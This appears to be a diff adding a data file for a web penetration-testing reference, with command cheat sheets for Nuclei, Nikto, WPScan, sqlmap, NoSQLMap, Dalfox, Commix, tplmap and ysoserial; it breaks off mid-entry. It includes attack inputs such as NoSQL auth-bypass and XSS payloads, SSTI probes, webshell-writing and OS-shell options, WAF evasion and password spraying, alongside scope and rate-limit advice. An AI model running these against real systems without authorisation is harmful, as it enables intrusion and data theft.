+              ["-tags <tags>", "Filter by tag: cve, exposure, misconfig, takeover, default-login"],
+              ["-severity <levels>", "Filter by severity: info, low, medium, high, critical"],
+              ["-id <id>", "Run a single template by its ID"],
+              ["-etags / -exclude", "Exclude noisy or dangerous template categories"],
+              ["-as", "Automatic scan — select templates by detected technology (Wappalyzer-style)"]
+            ]
+          },
+          {
+            title: "Template Categories",
+            type: "table",
+            columns: ["Category", "Detects"],
+            rows: [
+              ["cves", "Known CVEs with public detection logic"],
+              ["exposures", "Exposed config files, .git, backups, env files, dashboards"],
+              ["misconfiguration", "Security misconfigurations and weak settings"],
+              ["default-logins", "Services still on default credentials"],
+              ["takeovers", "Subdomain takeover conditions"],
+              ["technologies", "Fingerprinting templates that identify the stack"],
+              ["exposed-panels", "Login and admin panels reachable from outside"]
+            ]
+          },
+          {
+            title: "Performance & Output",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-rl <n>", "Rate limit (requests per second) — be a good neighbour"],
+              ["-c <n>", "Concurrency (templates run in parallel)"],
+              ["-bs <n>", "Bulk size (hosts scanned in parallel per template)"],
+              ["-json / -jsonl", "Structured output for tooling"],
+              ["-o <file>", "Write findings to a file"],
+              ["-silent", "Only print findings, no status noise"],
+              ["-timeout / -retries", "Tune for slow or flaky targets"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Standard pipeline from discovery", cmd: "subfinder -d target.com -silent | httpx -silent | \\\n  nuclei -severity medium,high,critical -o nuclei.txt" },
+              { label: "Hunt exposures and takeovers", cmd: "nuclei -l hosts.txt -tags exposure,takeover,default-login -o quickwins.txt" },
+              { label: "Technology-aware automatic scan", cmd: "nuclei -u https://target.com -as -severity high,critical\n# picks templates matching the detected stack" },
+              { label: "Scan for one fresh CVE across the estate", cmd: "nuclei -l hosts.txt -id CVE-2024-XXXXX" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Update templates before every engagement (-update-templates); the value is in the freshness of the community library.",
+              "Start with -severity high,critical and the exposure/takeover/default-login tags — that is where the fast, undeniable wins are.",
+              "Set a rate limit on production targets; Nuclei is fast enough to cause problems if you let it run flat out.",
+              "It only finds what a template describes — a clean Nuclei run means 'no known-templated issues', not 'secure'. Follow with manual testing.",
+              "Writing your own templates is easy and worth it for target-specific checks; the YAML DSL is well documented."
+            ]
+          }
+        ]
+      },
+      {
+        id: "nikto",
+        name: "Nikto",
+        url: "https://github.com/sullo/nikto",
+        description: "Classic web server scanner for known issues, files, and misconfigurations.",
+        brief: "Nikto is a long-standing web server scanner that checks a target against a database of thousands of known-dangerous files, outdated server versions, and common misconfigurations. It is noisy and not subtle, but it is comprehensive and fast to run, which makes it a solid early sweep to catch the obvious things — default files, dangerous CGIs, missing security headers, and server software with known problems.\n\nIt is old, and newer tools like Nuclei overlap with it, but it still surfaces findings the modern tools miss and remains a common item on a methodology checklist.",
+        quickReference: [
+          { label: "Scan a host", cmd: "nikto -h https://target.com" },
+          { label: "Scan a specific port", cmd: "nikto -h target.com -p 8443 -ssl" },
+          { label: "Save an HTML report", cmd: "nikto -h https://target.com -o report.html -Format htm" },
+          { label: "Tune which checks run", cmd: "nikto -h https://target.com -Tuning 123bde" }
+        ],
+        sections: [
+          {
+            title: "Key Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-h <host>", "Target host or URL"],
+              ["-p <port>", "Port(s) to scan"],
+              ["-ssl", "Force SSL/TLS"],
+              ["-o <file> -Format <fmt>", "Output to file (htm, csv, xml, json, txt)"],
+              ["-Tuning <ids>", "Restrict to specific check categories"],
+              ["-useproxy <url>", "Route through a proxy (e.g. Burp, to log findings)"],
+              ["-id <user:pass>", "HTTP basic auth credentials"],
+              ["-evasion <ids>", "IDS-evasion techniques (encoding, etc.)"]
+            ]
+          },
+          {
+            title: "Tuning Categories",
+            type: "table",
+            columns: ["ID", "Category"],
+            rows: [
+              ["1", "Interesting files / seen in logs"],
+              ["2", "Misconfiguration / default files"],
+              ["3", "Information disclosure"],
+              ["4", "Injection (XSS/script/HTML)"],
+              ["5", "Remote file retrieval (web root)"],
+              ["6", "Denial of service (skip on production)"],
+              ["b", "Software identification"],
+              ["e", "Reduce false positives"]
+            ]
+          },
+          {
+            title: "What It Finds",
+            type: "table",
+            columns: ["Category", "Examples"],
+            rows: [
+              ["Dangerous files", "Default CGIs, test scripts, backup files, admin scripts"],
+              ["Outdated software", "Server and component versions with known vulnerabilities"],
+              ["Misconfigurations", "Directory indexing, dangerous HTTP methods (PUT/DELETE), verbose errors"],
+              ["Missing headers", "Absent security headers (X-Frame-Options, CSP, HSTS)"],
+              ["Default content", "Sample apps and install pages left in place"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Quick early sweep", cmd: "nikto -h https://target.com -o nikto.html -Format htm\n# read it as a checklist of obvious issues to confirm manually" },
+              { label: "Route through Burp for logging", cmd: "nikto -h https://target.com -useproxy http://127.0.0.1:8080\n# every check appears in Burp's history for review" },
+              { label: "Skip DoS checks on production", cmd: "nikto -h https://target.com -Tuning 1235bde\n# omit category 6 to avoid disruptive tests" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Nikto is loud and makes no attempt at stealth — every request is obvious in the logs. Run it only where noise is acceptable.",
+              "Exclude tuning category 6 (DoS) on anything resembling production.",
+              "It produces false positives; treat every finding as a lead to confirm manually, not a confirmed vulnerability.",
+              "Proxy it through Burp (-useproxy) so its findings land in your history for follow-up.",
+              "It overlaps with Nuclei but still catches some legacy server issues the template scanners miss — run both for coverage."
+            ]
+          }
+        ]
+      },
+      {
+        id: "wpscan",
+        name: "WPScan",
+        url: "https://github.com/wpscanteam/wpscan",
+        description: "WordPress-focused scanner for vulnerable core, plugins, themes, and users.",
+        brief: "WordPress runs a huge share of the web, and its security posture is dominated by plugins and themes — thousands of third-party components of wildly varying quality. WPScan is the dedicated scanner for it: it fingerprints the WordPress version, enumerates installed plugins and themes and their versions, cross-references them against a vulnerability database, enumerates users, and can brute-force logins.\n\nIf WhatWeb or Nuclei tells you a target is WordPress, WPScan is the specialised follow-up that turns 'it's WordPress' into a concrete list of vulnerable components.",
+        quickReference: [
+          { label: "Standard scan", cmd: "wpscan --url https://target.com" },
+          { label: "Enumerate vulnerable plugins + users", cmd: "wpscan --url https://target.com -e vp,u --api-token <token>" },
+          { label: "Enumerate everything", cmd: "wpscan --url https://target.com -e ap,at,u" },
+          { label: "Password brute force", cmd: "wpscan --url https://target.com -U admin -P passwords.txt" }
+        ],
+        sections: [
+          {
+            title: "Enumeration Options (-e)",
+            type: "table",
+            columns: ["Code", "Enumerates"],
+            rows: [
+              ["vp", "Vulnerable plugins only (fast, high-signal)"],
+              ["ap", "All plugins (slower, thorough)"],
+              ["vt / at", "Vulnerable / all themes"],
+              ["u", "Usernames — the list to brute-force against"],
+              ["cb", "Config backups left on the server"],
+              ["dbe", "Database exports"],
+              ["tt", "Timthumb files (legacy image-resize vulnerabilities)"]
+            ]
+          },
+          {
+            title: "Key Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["--url <target>", "The WordPress site"],
+              ["--api-token <t>", "WPVulnDB token — required to see actual CVE details (free tier available)"],
+              ["-U / -P", "Usernames and password list for brute forcing"],
+              ["--plugins-detection <mode>", "passive, aggressive, or mixed detection"],
+              ["--random-user-agent", "Rotate UA to dodge simple blocking"],
+              ["--throttle <ms>", "Delay between requests"],
+              ["-o <file> -f <format>", "Output to file (cli, json)"]
+            ]
+          },
+          {
+            title: "Detection Modes",
+            type: "table",
+            columns: ["Mode", "Trade-off"],
+            rows: [
+              ["passive", "Only what is visible in page source — quiet, misses inactive plugins"],
+              ["aggressive", "Requests each plugin's known paths directly — finds hidden/inactive plugins, much louder"],
+              ["mixed", "Passive first, aggressive to confirm — the usual balance"],
+              ["Why it matters", "An inactive-but-installed vulnerable plugin is still a risk and only aggressive detection finds it"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Standard assessment", cmd: "wpscan --url https://target.com \\\n  -e vp,vt,u --api-token <token> \\\n  --plugins-detection mixed -o wpscan.json -f json" },
+              { label: "Enumerate users, then spray", cmd: "wpscan --url https://target.com -e u\n# take the usernames, then a careful password attempt:\nwpscan --url https://target.com -U users.txt -P top-passwords.txt --throttle 500" },
+              { label: "Deep plugin hunt", cmd: "wpscan --url https://target.com -e ap --plugins-detection aggressive --api-token <token>\n# finds installed-but-inactive plugins passive mode misses" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Get a free WPVulnDB API token — without it WPScan detects versions but cannot tell you which are actually vulnerable.",
+              "Aggressive plugin detection is what finds inactive-but-installed vulnerable plugins; passive alone misses them.",
+              "User enumeration feeds a login brute force, but mind the lockout/throttle — WordPress and its plugins may rate-limit or ban.",
+              "xmlrpc.php is worth checking; when enabled it enables faster brute forcing and can amplify some attacks.",
+              "Fingerprint first (WhatWeb/Nuclei) so you only bring WPScan to targets that are actually WordPress."
+            ]
+          }
+        ]
+      },
+      {
+        id: "sqlmap",
+        name: "sqlmap",
+        url: "https://github.com/sqlmapproject/sqlmap",
+        description: "Automated SQL injection detection and database takeover tool.",
+        brief: "sqlmap automates the whole lifecycle of SQL injection: it detects whether a parameter is injectable, works out the injection type and database engine, then exploits it — dumping data, reading and writing files, and in the right conditions running commands on the underlying OS. It supports every common technique (boolean/error/time-based blind, UNION, stacked queries) across MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and more.\n\nIt is the reference tool for SQLi, and its depth is enormous — but that depth is why it should be aimed carefully rather than blasted at everything.",
+        quickReference: [
+          { label: "Test a URL parameter", cmd: "sqlmap -u \"https://target.com/item?id=1\"" },
+          { label: "Test a captured request (recommended)", cmd: "sqlmap -r request.txt" },
+          { label: "Enumerate databases", cmd: "sqlmap -r request.txt --dbs" },
+          { label: "Dump a table", cmd: "sqlmap -r request.txt -D appdb -T users --dump" },
+          { label: "Auto-exploit at higher effort", cmd: "sqlmap -r request.txt --batch --level 3 --risk 2" }
+        ],
+        sections: [
+          {
+            title: "Target Specification",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-u <url>", "Target URL with a parameter to test"],
+              ["-r <file>", "Load a full HTTP request (from Burp) — preserves cookies, headers, method, body"],
+              ["--data <string>", "POST body to test"],
+              ["-p <param>", "Test only a specific parameter"],
+              ["--cookie <c>", "Authenticated session cookie"],
+              ["--headers / -H", "Custom headers"],
+              ["--method <m>", "HTTP method"]
+            ]
+          },
+          {
+            title: "Detection Tuning",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["--level <1-5>", "How thorough: higher tests more parameters, headers, and payloads"],
+              ["--risk <1-3>", "How aggressive: higher includes payloads that could modify data"],
+              ["--technique <BEUSTQ>", "Restrict to specific techniques (Boolean, Error, Union, Stacked, Time, inline Query)"],
+              ["--dbms <name>", "Skip detection by naming the database engine"],
+              ["--tamper <scripts>", "Apply payload transformations to evade WAFs"],
+              ["--random-agent", "Use a random User-Agent"]
+            ]
+          },
+          {
+            title: "Enumeration & Extraction",
+            type: "table",
+            columns: ["Flag", "Retrieves"],
+            rows: [
+              ["--dbs", "List databases"],
+              ["--tables -D <db>", "List tables in a database"],
+              ["--columns -D <db> -T <table>", "List columns"],
+              ["--dump -D <db> -T <table>", "Extract table data (add -C for specific columns)"],
+              ["--dump-all", "Everything (heavy — rarely appropriate on a real target)"],
+              ["--current-user / --current-db", "Context info about the DB session"],
+              ["--passwords", "Dump and attempt to crack DB user password hashes"]
+            ]
+          },
+          {
+            title: "Beyond Data (High Impact)",
+            type: "table",
+            columns: ["Flag", "Effect"],
+            rows: [
+              ["--file-read <path>", "Read a file from the database server's filesystem"],
+              ["--file-write / --file-dest", "Write a local file to the server (e.g. a webshell)"],
+              ["--os-shell", "Attempt an interactive OS shell (needs stacked queries / high privilege)"],
+              ["--os-cmd <cmd>", "Run a single OS command"],
+              ["--privileges / --is-dba", "Check DB user privileges — determines what escalation is possible"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Standard careful test", cmd: "# capture the request in Burp, save as request.txt\nsqlmap -r request.txt --batch --level 2 --risk 1\n# if injectable:\nsqlmap -r request.txt --dbs\nsqlmap -r request.txt -D appdb --tables\nsqlmap -r request.txt -D appdb -T users --dump" },
+              { label: "WAF evasion", cmd: "sqlmap -r request.txt --tamper=space2comment,between,charencode \\\n  --random-agent --level 3" },
+              { label: "Check for escalation potential", cmd: "sqlmap -r request.txt --is-dba --privileges\n# if DBA and stacked queries work, --os-shell may be possible" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Prefer -r with a captured request over -u; it preserves cookies, headers, and body so you test the endpoint exactly as the app sees it.",
+              "Start with low --level/--risk and raise only as needed. High risk includes payloads that can modify or delete data — dangerous on production.",
+              "--os-shell and --file-write are powerful and destructive; confirm they are in scope before using them, and never on production without explicit sign-off.",
+              "Use --tamper scripts to get past a WAF, but understand each one — some change the payload semantics.",
+              "sqlmap confirms and exploits; understanding the injection manually in Burp first makes you far more effective with it."
+            ]
+          }
+        ]
+      },
+      {
+        id: "nosqlmap",
+        name: "NoSQLMap",
+        url: "https://github.com/codingo/NoSQLMap",
+        description: "Automated NoSQL injection and database attacks, primarily against MongoDB.",
+        brief: "NoSQLMap is the NoSQL counterpart to sqlmap, focused mainly on MongoDB. NoSQL databases do not use SQL, but they are still injectable — through operator injection (smuggling in query operators like $ne, $gt, $regex), JavaScript injection in server-side evaluation, and authentication bypasses. NoSQLMap automates discovering and exploiting these, plus enumerating and attacking exposed MongoDB instances directly.\n\nIt fills a gap sqlmap does not cover, and NoSQL injection is common precisely because developers who have learned to parameterise SQL often do not realise their NoSQL queries are just as vulnerable.",
+        quickReference: [
+          { label: "Interactive mode", cmd: "python nosqlmap.py" },
+          { label: "The classic auth-bypass payload", cmd: "username[$ne]=x&password[$ne]=x" },
+          { label: "JSON operator injection", cmd: "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}" },
+          { label: "Regex username extraction", cmd: "username[$regex]=^admin&password[$ne]=x" }
+        ],
+        sections: [
+          {
+            title: "Attack Types",
+            type: "table",
+            columns: ["Type", "Description"],
+            rows: [
+              ["Operator injection", "Inject MongoDB operators ($ne, $gt, $regex, $where) to alter query logic"],
+              ["Authentication bypass", "$ne / $gt operators make a login query always true"],
+              ["Blind data extraction", "$regex character-by-character extraction of values like passwords"],
+              ["JavaScript injection", "Inject into $where or mapReduce where server-side JS is evaluated"],
+              ["Direct MongoDB attacks", "Enumerate and dump an exposed, unauthenticated MongoDB instance"]
+            ]
+          },
+          {
+            title: "Key Operators Abused",
+            type: "table",
+            columns: ["Operator", "Effect"],
+            rows: [
+              ["$ne", "Not equal — 'password not equal to x' is true for any real password"],
+              ["$gt / $lt", "Greater/less than — another always-true trick"],
+              ["$regex", "Pattern match — extract values one character at a time (blind)"],
+              ["$where", "Evaluate a JavaScript expression server-side — the dangerous one"],
+              ["$exists", "Test whether a field exists"],
+              ["$in", "Match any value in a list"]
+            ]
+          },
+          {
+            title: "Injection Contexts",
+            type: "table",
+            columns: ["Context", "How to inject"],
+            rows: [
+              ["URL parameters", "param[$ne]=x — PHP/Express parse bracket notation into nested objects"],
+              ["JSON body", "{\"field\": {\"$ne\": null}} — inject the operator as a nested object"],
+              ["Form-encoded", "field[$ne]=x in the POST body"],
+              ["Why it works", "The app passes user input straight into the query object without sanitising operators"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Manual auth bypass first", cmd: "# in Burp, change the login body from:\n#   {\"user\":\"admin\",\"pass\":\"x\"}\n# to:\n#   {\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}\n# a successful login confirms NoSQL injection" },
+              { label: "Blind extraction with regex", cmd: "# brute-force each character of a secret:\n#   pass[$regex]=^a  ... ^b ... until the response changes\n# NoSQLMap automates this character walk" },
+              { label: "Attack an exposed instance", cmd: "# if MongoDB (27017) is reachable and unauthenticated,\n# enumerate and dump databases directly rather than via the app" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "The $ne authentication bypass is the canonical NoSQL injection — try it by hand in Burp before reaching for automation; it is often a one-request win.",
+              "Bracket notation (param[$ne]=x) works because Express and PHP parse it into a nested object the query then trusts.",
+              "$where and mapReduce evaluate server-side JavaScript — those are the paths from injection to code execution, so prioritise finding them.",
+              "The tool can be finicky and its upkeep is intermittent; the manual techniques it embodies are the durable knowledge.",
+              "An exposed, unauthenticated MongoDB on 27017 is a direct-dump situation — check Shodan/Censys findings from recon."
+            ]
+          }
+        ]
+      },
+      {
+        id: "dalfox",
+        name: "Dalfox",
+        url: "https://github.com/hahwul/dalfox",
+        description: "Fast, parameter-aware XSS scanner with smart payload generation.",
+        brief: "Dalfox is a fast XSS scanner written in Go. It analyses how each parameter is reflected — the HTML context, whether it lands inside an attribute, a script block, or a URL — and then generates payloads tailored to break out of that specific context, rather than blindly firing a static list. It verifies findings to cut false positives and integrates cleanly into a pipeline.\n\nIts context-awareness is what sets it apart: it reasons about where your input appears and what characters are filtered, so it finds working XSS that a dumb payload-spray misses.",
+        quickReference: [
+          { label: "Scan a URL with parameters", cmd: "dalfox url \"https://target.com/search?q=test\"" },
+          { label: "Scan a list of URLs", cmd: "dalfox file urls.txt" },
+          { label: "Pipe from another tool", cmd: "cat urls.txt | dalfox pipe" },
+          { label: "Blind XSS with a callback", cmd: "dalfox url \"https://target.com/?q=1\" -b https://your.xss.ht" }
+        ],
+        sections: [
+          {
+            title: "Modes",
+            type: "table",
+            columns: ["Mode", "Use"],
+            rows: [
+              ["url", "Scan a single URL"],
+              ["file", "Scan a list of URLs from a file"],
+              ["pipe", "Read URLs from stdin — for chaining after katana/gau/ffuf"],
+              ["sxss", "Stored XSS mode — inject in one place, check for reflection elsewhere"],
+              ["server", "Run as an API server"]
+            ]
+          },
+          {
+            title: "Key Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-b <url>", "Blind XSS callback URL (out-of-band detection)"],
+              ["--custom-payload <file>", "Add your own payloads to the generated set"],
+              ["-p <param>", "Test only a specific parameter"],
+              ["--cookie / --header", "Send auth cookies and custom headers"],
+              ["--waf-evasion", "Enable WAF-bypass transformations"],
+              ["--deep-domxss", "More thorough DOM-XSS analysis"],
+              ["-o <file> --format json", "Structured output"]
+            ]
+          },
+          {
+            title: "How Context Analysis Works",
+            type: "table",
+            columns: ["Reflection context", "Payload approach"],
+            rows: [
+              ["HTML body", "Inject a tag: <script>, <img onerror>, <svg onload>"],
+              ["HTML attribute", "Break out of the attribute first: \"> then the tag"],
+              ["Inside <script>", "Break the JS string/expression: ';alert(1)//"],
+              ["URL / href", "javascript: scheme payloads"],
+              ["Filtered characters", "Dalfox detects what is blocked and adapts the payload"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Discovery-to-XSS pipeline", cmd: "katana -u https://target.com -silent | grep '=' \\\n  | dalfox pipe -o xss_findings.txt" },
+              { label: "Parameter discovery then XSS", cmd: "arjun -u https://target.com/page -oT params.txt\n# build URLs with the found params, then:\ndalfox file param_urls.txt" },
+              { label: "Blind XSS across many inputs", cmd: "dalfox file urls.txt -b https://your-collab.xss.ht\n# catches XSS that fires later in an admin panel or log viewer" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Context-awareness is the point — Dalfox reasons about where your input is reflected and what is filtered, so it beats static payload lists.",
+              "Feed it parameters, not bare URLs; pair it with Arjun for hidden parameters to widen the input surface.",
+              "Set a blind-XSS callback (-b) to catch stored/blind cases that fire out-of-band in an admin or logging context.",
+              "It confirms reflections to reduce false positives, but always verify a reported XSS by hand before reporting it.",
+              "It is a scanner, not a substitute for understanding the sink; manual review still finds the DOM XSS automation struggles with."
+            ]
+          }
+        ]
+      },
+      {
+        id: "commix",
+        name: "Commix",
+        url: "https://github.com/commixproject/commix",
+        description: "Automated OS command injection detection and exploitation.",
+        brief: "Commix (command injection exploiter) automates finding and exploiting OS command injection — the bug where user input reaches a shell command and lets you run arbitrary commands on the server. It handles the awkward cases: results-based, blind (time and file based), and the various ways input gets into a command, then gives you a pseudo-terminal on the target.\n\nCommand injection is one of the highest-severity web bugs because it is direct code execution on the host, and Commix is the sqlmap-equivalent that automates the detection and exploitation grunt work.",
+        quickReference: [
+          { label: "Test a URL parameter", cmd: "commix -u \"https://target.com/ping?host=127.0.0.1\"" },
+          { label: "Test a captured request", cmd: "commix -r request.txt" },
+          { label: "Test POST data", cmd: "commix -u https://target.com/ping --data=\"host=127.0.0.1\"" },
+          { label: "Drop into a pseudo-shell", cmd: "commix -u \"...\" --os-cmd=whoami   (or interactive on success)" }
+        ],
+        sections: [
+          {
+            title: "Injection Techniques",
+            type: "table",
+            columns: ["Technique", "Description"],
+            rows: [
+              ["Results-based", "Command output is reflected in the response — the easy, obvious case"],
+              ["Blind time-based", "No output; infer success from response delays (sleep)"],
+              ["Blind file-based", "Write output to a web-accessible file and read it back"],
+              ["Classic vs eval", "Injection into a shell command vs into a language eval() that shells out"]
+            ]
+          },
+          {
+            title: "Key Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-u <url>", "Target URL"],
+              ["-r <file>", "Load a request from a file (Burp export)"],
+              ["--data <string>", "POST body to test"],
+              ["-p <param>", "Test a specific parameter"],
+              ["--cookie <c>", "Authenticated session"],
+              ["--os-cmd <cmd>", "Run a single command"],
+              ["--technique <ctfe>", "Restrict techniques (classic, time, file, eval)"],
+              ["--level <1-3>", "Test more inputs (headers, cookies) at higher levels"]
+            ]
+          },
+          {
+            title: "Post-Exploitation",
+            type: "table",
+            columns: ["Capability", "Description"],
+            rows: [
+              ["Pseudo-terminal", "An interactive shell-like interface over the injection"],
+              ["--os-shell equivalents", "Upgrade toward a fuller shell where conditions allow"],
+              ["File access", "Read and write files on the target through the injection"],
+              ["Enumeration modules", "Built-in commands to gather system info quickly"],
+              ["Reverse shell", "Trigger a callback for a proper interactive shell"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Test an obvious sink", cmd: "# a 'ping', 'nslookup', 'convert', or 'export' feature is a prime suspect\ncommix -u \"https://target.com/tools/ping?host=127.0.0.1\" --level 2" },
+              { label: "From a captured request", cmd: "commix -r request.txt --os-cmd=id\n# confirm execution, then escalate to a shell/reverse shell" },
+              { label: "Blind, no output", cmd: "commix -u \"https://target.com/api?x=1\" --technique=t\n# time-based inference when nothing is reflected" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Suspect any feature that shells out: ping/traceroute tools, file converters, PDF/image processors, backup/export functions, and 'run diagnostics' buttons.",
+              "Command injection is direct code execution — one of the most serious web findings. Confirm scope before exploiting beyond a proof (id/whoami).",
+              "Blind time-based detection is slower but works when nothing is reflected — be patient and mind the noise.",
+              "Manually understanding the injection (shell metacharacters, quoting) makes Commix far more effective and helps craft a clean proof.",
+              "Never run destructive commands to 'prove' impact; a whoami/hostname is proof enough for a report."
+            ]
+          }
+        ]
+      },
+      {
+        id: "tplmap",
+        name: "tplmap",
+        url: "https://github.com/epinna/tplmap",
+        description: "Detects and exploits Server-Side Template Injection (SSTI) across many engines.",
+        brief: "tplmap automates Server-Side Template Injection — the bug where user input is embedded into a server-side template and evaluated, letting you run template code and, very often, escalate to full command execution. It supports a wide range of engines (Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, and many more), detects which one is in use, and exploits it up to code execution and a shell.\n\nSSTI is increasingly common as apps build responses from templates with user-controlled data, and it is high impact because most template engines expose a path to the underlying OS.",
+        quickReference: [
+          { label: "Test a URL parameter", cmd: "tplmap.py -u \"https://target.com/page?name=John\"" },
+          { label: "Test POST data", cmd: "tplmap.py -u https://target.com/page --data \"name=John\"" },
+          { label: "Get an OS shell", cmd: "tplmap.py -u \"https://target.com/page?name=John\" --os-shell" },
+          { label: "The classic detection probe", cmd: "Inject ${7*7} / {{7*7}} / <%= 7*7 %> and look for 49" }
+        ],
+        sections: [
+          {
+            title: "Detection Basics",
+            type: "table",
+            columns: ["Probe", "Engine hint"],
+            rows: [
+              ["{{7*7}} -> 49", "Jinja2, Twig (curly-brace engines)"],
+              ["${7*7} -> 49", "Freemarker, Velocity (dollar-brace)"],
+              ["<%= 7*7 %> -> 49", "ERB (Ruby)"],
+              ["{7*7} -> 49", "Smarty and similar"],
+              ["#{7*7} -> 49", "Some Ruby/others"],
+              ["Polyglot", "${{<%[%'\"}}%\\ — a probe that errors or reflects across many engines"]
+            ]
+          },
+          {
+            title: "Key Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-u <url>", "Target URL"],
+              ["--data <string>", "POST data to test"],
+              ["-e <engine>", "Force a specific template engine"],
+              ["--os-cmd <cmd>", "Run a single OS command"],
+              ["--os-shell", "Interactive OS shell"],
+              ["--upload / --download", "File transfer through the injection"],
+              ["--reverse-shell <host> <port>", "Trigger a reverse shell"],
+              ["-H / --cookie", "Headers and session"]
+            ]
+          },
+          {
+            title: "Why SSTI Escalates to RCE",
+            type: "table",
+            columns: ["Concept", "Description"],
+            rows: [
+              ["Templates evaluate code", "The engine is a small language interpreter running server-side"],
+              ["Object/sandbox escape", "Jinja2/Twig sandbox escapes reach Python/PHP internals and then os.system"],
+              ["Built-in exec paths", "Freemarker/Velocity expose classes that run OS commands directly"],
+              ["Data exposure minimum", "Even without RCE, SSTI leaks config, secrets, and internal objects"],
+              ["tplmap's job", "Fingerprint the engine and walk the known escape chain to a shell"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Confirm by hand, then automate", cmd: "# inject {{7*7}} (and ${7*7}, <%= 7*7 %>) in each reflected field\n# a rendered 49 confirms SSTI, then:\ntplmap.py -u \"https://target.com/greet?name=John\"" },
+              { label: "Escalate to command execution", cmd: "tplmap.py -u \"https://target.com/greet?name=John\" --os-cmd id\n# then --os-shell for interactive access (scope permitting)" },
+              { label: "Force the engine if detection is noisy", cmd: "tplmap.py -u \"...\" -e jinja2 --os-shell" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Confirm SSTI manually first with math probes ({{7*7}}, ${7*7}, <%= 7*7 %>) — a rendered 49 is unambiguous and tells you the engine family.",
+              "SSTI is not just data disclosure; most engines have a documented escape to OS command execution, so treat it as potential RCE.",
+              "tplmap is Python 2 and lightly maintained; if it fails, the manual escape payloads for the detected engine are well documented (e.g. PayloadsAllTheThings).",
+              "Distinguish SSTI from plain XSS: {{7*7}} rendering as 49 is server-side evaluation, not client-side reflection.",
+              "As always, stop at a proof (id/whoami) unless full exploitation is explicitly in scope."
+            ]
+          }
+        ]
+      },
+      {
+        id: "ysoserial",
+        name: "ysoserial",
+        url: "https://github.com/frohoff/ysoserial",
+        description: "Generates deserialization gadget-chain payloads for Java (and .NET via ysoserial.net).",
+        brief: "ysoserial generates payloads that exploit insecure deserialization in Java applications. When an app deserializes attacker-controlled data, and the classpath contains the right 'gadget' libraries, a crafted object graph can trigger a chain of method calls ending in command execution. ysoserial encapsulates dozens of these gadget chains (CommonsCollections, Spring, Groovy, and more) so you can produce a working payload for whatever libraries the target has.\n\nInsecure deserialization is a critical, often-overlooked bug class, and ysoserial (plus the separate ysoserial.net for .NET) is the standard tool for weaponising it.",
+        quickReference: [
+          { label: "Generate a CommonsCollections payload", cmd: "java -jar ysoserial.jar CommonsCollections1 \"id\" > payload.bin" },
+          { label: "List available gadget chains", cmd: "java -jar ysoserial.jar" },
+          { label: "Base64-encode for a cookie/param", cmd: "java -jar ysoserial.jar CommonsCollections5 \"id\" | base64 -w0" },
+          { label: ".NET equivalent", cmd: "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"cmd\"" }
+        ],
+        sections: [
+          {
+            title: "Common Gadget Chains",
+            type: "table",
+            columns: ["Chain", "Depends on"],
+            rows: [
+              ["CommonsCollections1-7", "Apache Commons Collections (very common on classpaths)"],
+              ["CommonsBeanutils1", "Apache Commons BeanUtils"],
+              ["Spring1 / Spring2", "Spring framework"],
+              ["Groovy1", "Groovy runtime"],
+              ["Hibernate1", "Hibernate ORM"],
+              ["Jdk7u21 / URLDNS", "JDK-only — URLDNS is a safe detection probe (triggers a DNS lookup, no RCE)"]
+            ]
+          },
+          {
+            title: "Finding the Injection Point",
+            type: "table",
+            columns: ["Indicator", "Where deserialization happens"],
+            rows: [
+              ["Java serialized magic bytes", "AC ED 00 05 (raw) or rO0AB (base64) in a cookie, parameter, or body"],
+              ["ViewState", "ASP.NET __VIEWSTATE (use ysoserial.net)"],
+              ["Framework endpoints", "RMI, JMX, T3 (WebLogic), JSF, and message queues"],
+              ["Content-Type", "application/x-java-serialized-object"],
+              ["File uploads", "An app that deserializes an uploaded object/session file"]
+            ]
+          },
+          {
+            title: "Detection Before Exploitation",
+            type: "table",
+            columns: ["Step", "Description"],
+            rows: [
+              ["Spot the blob", "Look for rO0AB / AC ED byte patterns in traffic (Burp)"],
+              ["URLDNS probe", "Send a URLDNS payload with a Collaborator/DNS callback — a lookup confirms deserialization without RCE"],
+              ["Enumerate gadgets", "Try chains matching likely libraries; errors often reveal the stack"],
+              ["Weaponise", "Once a chain lands, swap the command for your objective"],
+              ["GadgetProbe / Burp exts", "Help identify which libraries are on the classpath"]
+            ]
+          },
+          {
+            title: "Common Workflows",
